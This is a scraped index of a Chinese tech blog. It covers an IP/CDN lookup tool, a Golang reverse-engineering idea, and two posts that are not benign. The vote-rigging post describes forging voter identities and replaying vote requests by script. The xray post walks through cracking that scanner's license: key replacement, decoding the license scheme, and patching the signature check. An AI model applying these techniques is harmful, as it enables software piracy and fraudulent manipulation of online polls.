www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.148 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.147 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 查询所有信息 $ nslookup www.gov.cn | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 103.104.170.25 [新加坡 ] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] 单独使用 需要提前查询到 CNAME 域名 $ nali cdn cdn.somecdncname.com ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:8","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#查询-cdn-服务提供商"},{"categories":["coding"],"content":"查询 CDN 服务提供商 因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 nslookup 或者 dig 配合使用，在已经知道 CNAME 后可单独使用 只查询 CDN 服务提供商 $ nslookup www.gov.cn | nali cdn Server: 127.0.0.53 Address: 127.0.0.53#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.148 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.147 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 查询所有信息 $ nslookup www.gov.cn | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 103.104.170.25 [新加坡 ] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] 单独使用 需要提前查询到 CNAME 域名 $ nali cdn cdn.somecdncname.com ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:8","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#只查询-cdn-服务提供商"},{"categories":["coding"],"content":"查询 CDN 服务提供商 因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 nslookup 或者 dig 配合使用，在已经知道 CNAME 后可单独使用 只查询 CDN 服务提供商 $ nslookup www.gov.cn | nali cdn Server: 127.0.0.53 Address: 127.0.0.53#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.148 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.147 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 查询所有信息 $ nslookup www.gov.cn | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 103.104.170.25 [新加坡 ] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] 单独使用 需要提前查询到 CNAME 域名 $ nali cdn cdn.somecdncname.com ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:8","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#查询所有信息"},{"categories":["coding"],"content":"查询 CDN 服务提供商 因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 nslookup 或者 dig 配合使用，在已经知道 CNAME 后可单独使用 只查询 CDN 服务提供商 $ nslookup www.gov.cn | nali cdn Server: 127.0.0.53 Address: 127.0.0.53#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.148 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.147 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 查询所有信息 $ nslookup www.gov.cn | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 103.104.170.25 [新加坡 ] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] 单独使用 需要提前查询到 CNAME 域名 $ nali cdn cdn.somecdncname.com ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:8","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#单独使用"},{"categories":["coding"],"content":"用户交互 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#用户交互"},{"categories":["coding"],"content":"查看帮助 $ nali --help Usage: nali [flags] nali [command] Available Commands: cdn Query cdn service provider help Help about any command parse Query IP information update update chunzhen ip database Flags: -h, --help help for nali -t, --toggle Help message for toggle Use \"nali [command] --help\" for more information about a command. ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:1","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#查看帮助"},{"categories":["coding"],"content":"更新纯真数据库 $ nali update 2020/07/17 12:53:46 正在下载最新纯真 IP 库... 2020/07/17 12:54:05 已将最新的纯真 IP 库保存到本地 /root/.nali/qqwry.dat ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:2","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#更新纯真数据库"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用-geoip2-数据库"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#windows平台"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用geoip数据库"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用ipip数据库"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#linux平台"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用geoip数据库-1"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用ipip数据库-1"},{"categories":["coding"],"content":"更换数据库目录 如果未指定数据库存放目录，数据库默认将存放在 ~/.nali 设置环境变量 NALI_DB_HOME 来指定数据库目录 set NALI_DB_HOME=D:\\nalidb or export NALI_DB_HOME=/home/nali ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:5:4","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#更换数据库目录"},{"categories":["coding"],"content":"感谢列表 纯真QQIP离线数据库 qqwry mirror qqwry纯真数据库解析 ZX公网ipv6数据库 Geoip2 city数据库 geoip2-golang解析器 CDN provider数据库 IPIP数据库 IPIP数据库解析 Cobra CLI库 Nali-cli ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:6:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#感谢列表"},{"categories":["coding"],"content":"开源证书 MIT ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:7:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#开源证书"},{"categories":["coding"],"content":"相信大家都经历过朋友圈、群组里各种转发求投票的消息，有需求就会有刷票 关于刷票我自己也稍微研究过，这里说的刷票是指刷投票，不是黄牛那种抢票 ","date":"2020-07-13","objectID":"https://zu1k.com/posts/security/web-security/brush-votes/:0:0","series":null,"tags":["coding"],"title":"关于刷票","uri":"https://zu1k.com/posts/security/web-security/brush-votes/#"},{"categories":["coding"],"content":"初识刷票 人生中第一次刷票是在大一，舍友的姐姐结婚拍婚纱照，摄影店给了一个点赞链接，承诺点赞数量超过500票免费送豪华相册和相框 舍友让我们帮着转发和点赞，这种东西大家都懂，不想污染了朋友圈，但又不能不帮舍友，碰巧当时正在研究微信抓包啥的，便想研究一下看看能不能刷票 投票网页要求必须微信打开，如果是普通浏览器打开不让投票，但是在微信进行投票它也没有弹出那个获取微信个人信息的确认框，这让我怀疑他根本没有利用微信的信息进行身份确认，有可能可以伪造身份进行刷票 早期微信抓包非常简单，手机root后安装xposed，使用JustTrustMe插件信任所有证书，然后手机安装burp的证书，wifi使用burp的代理，然后就能使用burp对https进行抓包了 抓包后发现投票的确没有仔细检查个人信息，于是通过Burp的Intruder伪造了身份，重放几百次顺利给舍友刷取几百票，圆满完成他姐姐交给他的任务 ","date":"2020-07-13","objectID":"https://zu1k.com/posts/security/web-security/brush-votes/:1:0","series":null,"tags":["coding"],"title":"关于刷票","uri":"https://zu1k.com/posts/security/web-security/brush-votes/#初识刷票"},{"categories":["coding"],"content":"前几天的刷票 前几天出于好奇又刷了一波票，这次经历是我写这篇文章的主要动机 前几天，我们导员、任课老师、教务等疯狂发钉钉、朋友圈、QQ群、QQ空间，让帮我们学弟投票 随手投上一票，发现投票网站需要使用姓名和手机号码注册，但是没有验证手机验证码，并且没有限制浏览器，感觉必有刷票的机会 于是对网页的所有请求进行抓包分析，发现投票是使用WebSocket进行的，投票时只需要给出登录成功的token和要投的队伍号 关键就在这个登录上了，如果能够有效验证投票者身份就能够减轻刷票，但是分析注册和登录请求发现并没有对用户身份进行有效验证，手机号码可以随便伪造 并且，姓名字段没有任何要求，没有限制长度，没有限制必须是中文，随便一个字符串就能被接受 于是写了一个程序，自动伪造身份登录、投票，循环这个过程 ","date":"2020-07-13","objectID":"https://zu1k.com/posts/security/web-security/brush-votes/:2:0","series":null,"tags":["coding"],"title":"关于刷票","uri":"https://zu1k.com/posts/security/web-security/brush-votes/#前几天的刷票"},{"categories":["coding"],"content":"认识与建议 上面两个案例是成功的刷票经历，我也经历过几次失败的刷票经历，在失败的经历中，那些投票系统都是利用微信提供的用户信息验证用户身份，而微信本身对用户审核的很严（没办法伪造），我也没有多个微信号，刷票自然失败 实际上，刷票过程最重要的是伪造投票者身份，欺骗投票系统是不同用户进行的投票，所以投票系统防刷票最重要的就是验证用户身份 在实际应用中有很多验证用户身份的方法： 验证手机号（发验证码的那种） 验证是否真人（极验、reCaptcha） 利用微信提供的身份 对于验证手机号，刷票组织可以轻松的获取大量手机号，包括各种真号码、虚拟号码，这种方法可以轻松绕过 对于使用机器人验证器，绕过比较麻烦，但是也是可以通过程序绕过的，并且刷票组织有可能人力手工进行验证 使用微信提供的身份信息是最难搞的，因为微信本身审核的很严，提供的身份又无法伪造，这里利用的是微信对用户身份的验证，是可以信任的。但是也不是没有绕过的方法，刷票组织有时候会养了大批量的微信号用来刷票，利用群控手段也可以绕过。 并且，有很多刷票组织养着很多群，可以提供真人投票服务，这种刷票成本非常高，但是是无法检测的，刷票成功率100% 针对刷票行为，无法完全避免，我们能做的就是通过各种方式对用户身份进行验证，检查用户IP，尽量避免身份伪造 同时，可以对投票请求的频率等信息进行分析，因为脚本刷票投票会很集中、时间间隔会比较均匀 ","date":"2020-07-13","objectID":"https://zu1k.com/posts/security/web-security/brush-votes/:3:0","series":null,"tags":["coding"],"title":"关于刷票","uri":"https://zu1k.com/posts/security/web-security/brush-votes/#认识与建议"},{"categories":["reverse"],"content":"在前段时间对xray进行逆向过程中，发现golang编译的程序会有巨多函数，不能说都是多余的，但是大部分函数的确不是用户编写的代码生成的，而是golang运行时和各种库所需要的东西 同时，因为去除了符号表，这些大量的非实际业务代码会对我们逆向工作造成极大困难，如果能够利用一些自动化工具重建符号表或者重新命名，就可以极大的便利我们逆向 ","date":"2020-06-20","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/:0:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向思考","uri":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/#"},{"categories":["reverse"],"content":"golang特殊段 在本次逆向的过程中，我遇到了上述的问题，在网上搜索发现了一个ida插件， IDAGolangHelper 这个插件的作者对golang编译器有深入的研究，他发现golang编译器在linux平台下交叉编译windows平台下运行的程序时，会生成一个特殊的段.gopclntab，在这个段中会保存一份特殊的符号表，作者利用这个段的信息对符号表进行了重建，我在使用过程中发现效果不错 但是该方法的使用是由限制条件的，如果没有这个段的信息就完全无法使用这个工具了 ","date":"2020-06-20","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/:1:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向思考","uri":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/#golang特殊段"},{"categories":["reverse"],"content":"基于同源性 golang编译生成的程序中大部分函数都是golang运行时函数和一些库函数 运行时函数与golang版本、运行平台和操作系统有关，感觉也会与是否采用交叉编译有关系，我没有深入研究 而库函数分为官方库和第三方库两种，官方库是golang官方维护的基本函数库，大家用的都是相同的，第三方库大家用的实际上也是比较集中，golang生态还不是非常完善，好用的库就那么多 基于以上的特点，我们可以考虑使用同源性分析的方法 ","date":"2020-06-20","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/:2:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向思考","uri":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/#基于同源性"},{"categories":["reverse"],"content":"预先的工作 在逆向之前，我们需要进行预先的准备 首先需要使用不同版本、不同平台的golang编译器对go运行时函数、基本库函数、知名第三方库函数等代码针对不同目标平台、目标系统进行编译，生成二进制程序，然后对二进制的函数提取特征，建立函数的特征库 ","date":"2020-06-20","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/:2:1","series":null,"tags":["reverse","Golang"],"title":"Golang逆向思考","uri":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/#预先的工作"},{"categories":["reverse"],"content":"特征匹配 在逆向的时候，我们就可以先分析程序的golang版本、编译平台、运行平台，然后使用相对应的特征库对去除了符号表的二进制函数进行特征匹配，通过这种方法可以对大部分基本的函数重建符号表，而剩余的小量函数便可以确定为用户编写的代码，需要我们深入分析 这个工作应该已经有人开始做了 ","date":"2020-06-20","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/:2:2","series":null,"tags":["reverse","Golang"],"title":"Golang逆向思考","uri":"https://zu1k.com/posts/security/reverse/golang-reverse-thinking/#特征匹配"},{"categories":["reverse"],"content":"xray社区高级版逆向破解，破解工具、关键算法细节","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":" 首先感谢 长亭科技 提供 xray 这款非常方便非常好用的安全工具 俗话说：没有人破解的工具不是好工具 根据没有任何数据支持的统计，大部分安全研究人员使用的安全工具都是盗版 包括但不限于： IDA \\ JEB \\ BurpSuite \\ Vmware 前几天长亭官方有个活动，可以领 2 个月的 xray 社区高级版证书，正好趁这个机会逆向分析了一下 xray 的证书算法，写了一个证书生成器 因为 xray 证书用到了 rsa 算法，所以需要替换 xray 程序中的公钥，将该功能也集成在工具中了 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:0:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#"},{"categories":["reverse"],"content":"工具使用 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:1:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#工具使用"},{"categories":["reverse"],"content":"查看帮助 使用 -h 查看帮助 PS \u003e .\\xray-cracker -h 破解xray高级版证书，使用 -h 参数查看使用帮助 Usage of xray-cracker: -c string 替换xray程序内置公钥，需要指定xray程序文件路径 -g string 生成一个永久license，需要指定用户名 -p string 解析官方证书，需要指定证书路径 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:1:1","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#查看帮助"},{"categories":["reverse"],"content":"生成证书 使用 -g username 生成永久证书 PS \u003e .\\xray-cracker -g \"我叫啥\" 破解xray高级版证书，使用 -h 参数查看使用帮助 证书已写入文件：xray-license.lic ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:1:2","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#生成证书"},{"categories":["reverse"],"content":"破解 xray 使用 -c path-to-xray 修改 xray 内置公钥 PS \u003e .\\xray-cracker -c .\\xray_windows_amd64.exe 破解xray高级版证书，使用 -h 参数查看使用帮助 public key index: 16741321 文件写入成功： .\\xray_windows_amd64.exe 工具虽然是 windows 平台下运行，但是照样可以破解其他平台 xray 目前 xray 最新版是 1.0.0，现在全平台全版本通杀 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:1:3","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#破解-xray"},{"categories":["reverse"],"content":"破解效果 使用修改版 xray 和永久证书后，效果如下 PS \u003e .\\xray_windows_amd64.exe version __ __ _____ __ __ \\ \\ / / | __ \\ /\\ \\ \\ / / \\ V / | |__) | / \\ \\ \\_/ / \u003e \u003c | _ / / /\\ \\ \\ / / . \\ | | \\ \\ / ____ \\ | | /_/ \\_\\ |_| \\_\\ /_/ \\_\\ |_| Version: 1.0.0/62161168/COMMUNITY-ADVANCED Licensed to 我叫啥, license is valid until 2099-09-09 08:00:00 [xray 1.0.0/62161168] Build: [2020-06-13] [windows/amd64] [RELEASE/COMMUNITY-ADVANCED] Compiler Version: go version go1.14.1 linux/amd64 License ID: 00000000000000000000000000000000 User Name: 我叫啥/00000000000000000000000000000000 Not Valid Before: 2020-06-12 00:00:00 Not Valid After: 2099-09-09 08:00:00 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:2:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#破解效果"},{"categories":["reverse"],"content":"部分细节 距离博文发布已经过了快一个月了，补充一点点细节信息，希望能够帮助到部分研究学习的同学 这里只给出使用的关键函数和关键流程，一些重要参数细节需要自己探索，可以动态单步调试获得 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:3:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#部分细节"},{"categories":["reverse"],"content":"AES 解密 decode_data, err := base64.StdEncoding.DecodeString(licenseString) if err != nil { panic(err) } aesDecData, err := AesCBCDecryptAndUnPad(decode_data[17:]) if err != nil { panic(err) } licensePlainJsonBytes := aesDecData[0x102:] ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:3:1","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#aes-解密"},{"categories":["reverse"],"content":"RSA 签名验证 sum := sha256.Sum256(licensePlainJsonBytes) err = rsa.VerifyPSS(pubKey, crypto.SHA256, sum[:], aesDecData[2:0x102], nil) ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:3:2","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#rsa-签名验证"},{"categories":["reverse"],"content":"2020年8月27日 补充 xray 官方在 1.3.0 版本中更换了授权验证机制，所以破解仅支持到 1.2.0 版本，本文使用代码现在开源： https://github.com/zu1k/xray-crack ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:4:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年8月27日-补充"},{"categories":["reverse"],"content":"2020年9月30日 补充 前几天有大佬私发我一个 License，我就又对证书算法研究了一下 相关代码也已经更新到 github 了 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:5:0","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#2020年9月30日-补充"},{"categories":["reverse"],"content":"证书生成 证书生成验证整体的思路没有大的改动，还是先 AES 解密，然后 RSA 签名验证，只是前后增加了两处简单的变换 在解密前有一个简单的交换，开始和最后的两个两个没有参与运算（开始第一个字节是证书版本号） right := len(base64DecodeData) - 1 for l := 1; l \u003c right; l++ { r := right - l if l \u003e= r { break } base64DecodeData[l], base64DecodeData[r] = base64DecodeData[r], base64DecodeData[l] } 然后进行 aes 解密，密钥是写死的，IV 是附加在证书里面的，刚刚的变换结束后，除去第一个字节是版本号，紧接着的 16 个字节是 AES 的 IV aesDecData, err := Decrypt(base64DecodeData[17:], base64DecodeData[1:17]) AES 解密后就会遇到另一个变换，是简单的异或处理 for i := 0; i \u003c len(aesDecData); i++ { aesDecData[i] = aesDecData[i] ^ 0x44 } 然后后面的部分就跟之前一样了 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:5:1","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#证书生成"},{"categories":["reverse"],"content":"公钥 在新的版本中，RSA 的公钥被加密处理了，在运行的时候解密，这样做可以防止我们通过简单的公钥替换通杀所有的版本和平台 通过逆向发现，解密函数有二百多个局部变量，先是变量之间互相交换，然后两两进行加、减、异或等操作来还原公钥信息 我推测是用程序生成的代码，然后那生成的代码编译的，这样可以在每一次编译的时候重新生成一下代码，增加我们破解的时间 从这一方面出发，我只能变换一下思路，不能去硬刚 Golang 中 RSA 签名验证代码如下： err := rsa.VerifyPSS(pubKey, crypto.SHA256, sum[:], aesDecData[2:0x102], nil) if err != nil { fmt.Println(\"签名验证 失败\") } else { fmt.Println(\"签名验证 成功\") } 很明显，是通过判断返回值是否为空来确定签名验证是否成功的，在汇编中一般为test eax,eax，然后setnz或者setz，所以我可以修改这里 但是这种方法我只能手工修改，目前没有实现用程序来自动化 主要是无法确定应该修改哪一个地方，因为出现了不止一次，一个特征是调用 VerifyPSS 的那个 Call，可以尝试自己解析 pclntab 段，从中还原符号表找到这个验证函数的入口，然后找搜索关键 Call，再在这个 call 后面两三个汇编处找 setnz 或者 setz 进行修改 ","date":"2020-06-18","objectID":"https://zu1k.com/posts/security/reverse/xray-cracker/:5:2","series":null,"tags":["Crack","reverse"],"title":"xray社区高级版破解","uri":"https://zu1k.com/posts/security/reverse/xray-cracker/#公钥"},{"categories":["reverse"],"content":"2020年10月4日 补充 感谢 @Lz1y 大佬在 PR#3 中提供的思路，现在已能够自动patch非arm版本的xray二进制了 